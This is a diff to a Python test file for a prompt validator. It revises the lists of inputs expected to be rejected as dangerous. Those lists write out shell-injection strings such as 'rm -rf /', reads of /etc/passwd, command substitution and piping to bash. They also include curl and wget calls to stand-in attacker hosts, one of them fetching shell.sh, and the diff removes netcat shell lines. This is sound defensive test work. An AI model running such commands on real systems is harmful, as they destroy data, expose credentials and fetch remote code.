@@ -59,13 +59,14 @@ class TestValidatePrompt:
             assert "dangerous" in exc_info.value.detail.lower()
 
     def test_shell_injection_chars_raises_exception(self):
-        """Test: Shell injection characters raise HTTPException 400."""
+        """Test: Dangerous command patterns raise HTTPException 400."""
         dangerous_prompts = [
-            "ls; rm -rf /",  # Semicolon
-            "cat file & echo",  # Ampersand
-            "test | grep",  # Pipe
-            "hello `whoami`",  # Backticks
-            "price is $100",  # Dollar sign
+            "ls; rm -rf /",  # Semicolon + dangerous command
+            "ls; cat /etc/passwd",  # Semicolon + cat
+            "$(whoami)",  # Command substitution
+            "$(cat /etc/passwd)",  # Command substitution
+            "echo hello | bash",  # Pipe to shell
+            "data | python -c 'import os'",  # Pipe to python
         ]
 
         for prompt in dangerous_prompts:
@@ -91,12 +92,12 @@ class TestValidatePrompt:
             assert "dangerous" in exc_info.value.detail.lower()
 
     def test_network_commands_raises_exception(self):
-        """Test: Network commands raise HTTPException 400."""
+        """Test: Network commands with URLs raise HTTPException 400."""
         dangerous_prompts = [
             "curl http://evil.com",
             "wget http://malware.com",
-            "nc -e /bin/sh",
-            "netcat localhost 4444",
+            "curl https://attack.com/shell.sh",
+            "wget ftp://files.com/malware",
             "CURL http://test.com",  # Case insensitive
         ]
 
